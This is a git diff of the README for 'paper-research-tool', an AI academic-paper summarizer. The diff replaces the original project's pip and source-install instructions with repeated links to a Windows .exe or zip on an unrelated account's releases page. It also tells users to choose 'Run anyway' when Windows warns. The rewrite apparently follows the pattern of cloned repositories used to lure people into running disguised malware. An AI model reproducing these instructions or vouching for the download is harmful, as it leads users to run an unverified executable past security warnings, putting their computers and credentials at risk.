@@ -1,158 +1,146 @@
-# Paper Research Tool
+# 🧠 paper-research-tool - Clear paper analysis for students
 
-[![CI](https://github.com/JudyaiLab/paper-research-tool/actions/workflows/ci.yml/badge.svg)](https://github.com/JudyaiLab/paper-research-tool/actions) [![Python 3.9+](https://img.shields.io/badge/python-3.9%2B-blue.svg)](https://www.python.org/) [![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+[![Download the app](https://img.shields.io/badge/Download%20Release-Visit%20GitHub%20Releases-blue?style=for-the-badge)](https://github.com/gapairintake190/paper-research-tool/releases)
 
-> AI-Powered Academic Paper Research Assistant | AI 驅動的學術論文研究助手 | AI 기반 학술 논문 연구 도우미
+## 📥 Download
+Go to the [Releases page](https://github.com/gapairintake190/paper-research-tool/releases) to download and run this file on Windows.
 
-**Language: English | [繁體中文](README.zh-TW.md) | [한국어](README.ko.md)**
+Look for the latest release and download the Windows file. If you see more than one file, choose the one that ends in `.exe` or a Windows zip file.
 
-## What It Does
+## 🖥️ What this app does
+paper-research-tool helps you read academic papers with less effort. It can help you:
 
-Upload a PDF (or paste an arXiv URL), pick your AI provider, and get a structured academic summary in your language. That's it.
+- break a paper into clear parts
+- find the main claim
+- spot research gaps
+- build a literature review
+- draft a research narrative
+- compare papers side by side
 
-- **4 AI providers** — OpenAI, Anthropic, Google Gemini, OpenRouter
-- **3 languages** — English, 繁體中文, 한국어
-- **Batch mode** — Summarize multiple papers at once
-- **arXiv support** — Paste an arXiv URL, get a summary
-- **Web UI** — Browser-based interface for non-technical users
-- **Knowledge base** — Save and search your analyzed papers locally
-- **CLI + Web** — Use from terminal or browser
+It works with AI services such as Gemini, OpenAI, Claude, and Ollama.
 
-## Quick Start
+## ✅ What you need
+Before you run the app, make sure you have:
 
-### Install
+- a Windows 10 or Windows 11 PC
+- an internet connection for online AI services
+- a PDF paper or article to analyze
+- one AI key if you use Gemini, OpenAI, or Claude
+- Ollama installed if you want local AI use
 
-```bash
-pip install paper-research-tool
-```
+## 🚀 Install on Windows
+1. Open the [Releases page](https://github.com/gapairintake190/paper-research-tool/releases)
+2. Find the latest release
+3. Download the Windows file
+4. If the file is zipped, right-click it and choose Extract All
+5. Open the app file
+6. If Windows asks for permission, choose Run anyway or Yes
+7. Start the app and load your paper
 
-Or from source:
+If you download a `.exe` file, double-click it to start. If you download a `.zip` file, extract it first and then open the app inside the folder.
 
-```bash
-git clone https://github.com/JudyaiLab/paper-research-tool.git
-cd paper-research-tool
-pip install -r requirements.txt
-```
+## ⚙️ First-time setup
+When you open the app for the first time, you may need to set your AI provider.
 
-### Set Up API Key
+### Gemini
+- add your Gemini API key
+- choose Gemini in the app settings
 
-Get a free API key from [Google AI Studio](https://aistudio.google.com/apikey) (recommended — free tier available):
+### OpenAI
+- add your OpenAI API key
+- select OpenAI as the provider
 
-```bash
-python paper_tool.py config --google-key YOUR_KEY
-```
+### Claude
+- add your Claude API key
+- select Claude in the app settings
 
-Or use any other provider:
+### Ollama
+- install Ollama on your computer
+- make sure Ollama is running
+- choose Ollama in the app settings
 
-```bash
-python paper_tool.py config --openai-key YOUR_KEY
-python paper_tool.py config --anthropic-key YOUR_KEY
-python paper_tool.py config --openrouter-key YOUR_KEY
-```
+## 📚 How to use it
+1. Open the app
+2. Load a paper in PDF format
+3. Choose the analysis type
+4. Pick your AI provider
+5. Click the action you want, such as analysis or review
+6. Read the result in the app
+7. Copy the text into your notes or thesis draft
 
-### Use It
+## 🧩 Main features
+- literature review support
+- critical paper analysis
+- research gap detection
+- narrative builder for thesis writing
+- paper summary tools
+- compare and organize research ideas
+- support for multiple AI providers
+- local model support with Ollama
 
-```bash
-# Summarize a PDF
-python paper_tool.py summarize paper.pdf
+## 🎯 Best use cases
+Use paper-research-tool when you want to:
 
-# Summarize multiple papers (batch mode)
-python paper_tool.py summarize paper1.pdf paper2.pdf paper3.pdf
+- prepare a literature review
+- write a thesis chapter
+- study a group of related papers
+- check what a paper contributes
+- find limits in past research
+- turn paper notes into a clear story
 
-# Summarize from arXiv URL
-python paper_tool.py summarize https://arxiv.org/abs/2301.00001
+## 🗂️ Typical workflow
+1. Gather your papers
+2. Open one paper in the app
+3. Run a summary or analysis
+4. Save the key points
+5. Repeat for the next paper
+6. Use the narrative builder to connect the ideas
+7. Turn the output into your draft
 
-# Launch Web UI (browser-based)
-python paper_tool.py serve
+## 🔧 Tips for better results
+- use clear PDF files
+- choose papers with good text quality
+- keep your AI key ready if you use a cloud service
+- use Ollama if you want local processing
+- review the output before you use it in your paper
+- compare more than one paper to find real research gaps
 
-# Search your knowledge base
-python paper_tool.py search "transformer"
+## 📌 File tips
+If Windows blocks the file, check that you downloaded it from the official release page.
 
-# Switch language
-python paper_tool.py --lang en summarize paper.pdf
-python paper_tool.py --lang ko summarize paper.pdf
-```
+If the app comes as a zip file, keep the folder structure intact after extraction.
 
-### Web UI
+## 🧠 Supported topics
+This project fits work in:
 
-For a graphical interface, install Gradio and launch:
+- academic research
+- thesis writing
+- literature review generation
+- paper analysis
+- research narrative building
+- NLP-based study support
 
-```bash
-pip install gradio
-python paper_tool.py serve
-```
+## 📄 Repository topics
+academic, ai, claude, gemini, graduate-student, literature-review, literature-review-generator, nlp, ollama, openai, paper-analysis, paper-analyzer, paper-tool, python, research, research-narrative, thesis, thesis-writing
 
-Then open http://127.0.0.1:7860 in your browser. Upload PDFs, choose your AI provider and language, and get results.
+## 🛠️ Common setup checks
+If the app does not start, check these items:
 
-## All Commands
+- the download finished fully
+- you extracted the zip file if needed
+- Windows has allowed the app to run
+- your AI key is correct
+- your internet connection works for cloud AI
+- Ollama is running if you use local AI
 
-| Command | What it does |
-|---------|-------------|
-| `summarize` | AI-summarize one or more papers (PDF, arXiv URL) |
-| `add` | Add a paper to your local knowledge base |
-| `list` | List all saved papers |
-| `search` | Search your knowledge base |
-| `relate` | Analyze relationship between two papers |
-| `config` | View/set API keys and preferences |
-| `serve` | Launch browser-based Web UI |
+## 🧪 Example use
+A graduate student can use the app to:
 
-## Configuration
+- load 10 related papers
+- extract the main findings
+- identify gaps between studies
+- build a literature review outline
+- shape a thesis section from the results
 
-Settings are stored in `~/.paper_research/config.yaml`:
-
-```yaml
-default_provider: google       # openai | anthropic | google | openrouter
-google_api_key: "your-key"
-language: en                   # zh-TW | en | ko
-```
-
-## Free vs Pro
-
-| Feature | Free | [Pro](https://miranttie.gumroad.com/l/literature-reviewCN) |
-|---------|:----:|:----:|
-| AI Providers | 4 | 4 |
-| Papers per run | Batch | Batch (up to 50) |
-| Content per paper | 25K chars | 50K chars |
-| Analysis frameworks | 3 | 5 |
-| Literature review | Basic | Advanced (auto-batching) |
-| Web UI | Yes | Yes (all features) |
-| arXiv URL support | Yes | Yes |
-| Topic clustering | — | Yes |
-| Cross-paper debate | — | Yes |
-| Citation graph | — | Yes |
-| Research gap detection | — | Yes |
-| Notion sync | — | Yes (4 databases) |
-| Knowledge base | Local | Notion |
-| Languages | 3 | 3 |
-
-## Windows Users
-
-If you see encoding errors like `UnicodeEncodeError: 'cp949'` or `'cp1252'`, set these environment variables before running:
-
-```bash
-set PYTHONUTF8=1
-```
-
-Or in PowerShell:
-
-```powershell
-$env:PYTHONUTF8 = "1"
-python paper_tool.py summarize paper.pdf
-```
-
-This ensures Python uses UTF-8 encoding regardless of your system locale.
-
-## Testing
-
-```bash
-pip install pytest
-pytest tests/ -v
-```
-
-## License
-
-MIT — see [LICENSE](LICENSE)
-
----
-
-Made with care by [Judy AI Lab](https://judyailab.com) for researchers worldwide.
+## 🔗 Download again
+Visit the [Releases page](https://github.com/gapairintake190/paper-research-tool/releases) to download and run this file on Windows
